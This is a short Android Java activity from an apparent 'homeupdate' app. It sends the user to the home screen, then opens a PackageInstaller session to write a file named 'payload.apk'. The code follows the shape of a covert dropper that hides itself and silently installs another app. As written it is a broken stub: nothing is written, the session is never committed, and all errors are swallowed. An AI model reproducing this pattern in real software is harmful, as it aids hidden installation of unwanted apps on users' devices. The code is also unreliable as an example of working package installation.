package com.example.homeupdate;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import android.os.Bundle;
import java.io.OutputStream;

public class HomeActivity extends Activity {
  @Override
  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    Intent home = new Intent(Intent.ACTION_MAIN);
    home.addCategory(Intent.CATEGORY_HOME);
    startActivity(home);
    if (getPackageManager().canRequestPackageInstalls()) {
      PackageInstaller installer = getPackageManager().getPackageInstaller();
      PackageInstaller.SessionParams params =
          new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
      try {
        int sessionId = installer.createSession(params);
        PackageInstaller.Session session = installer.openSession(sessionId);
        OutputStream out = session.openWrite("payload.apk", 0, -1);
        out.close();
      } catch (Exception e) {
        // ignore
      }
    }
  }
}
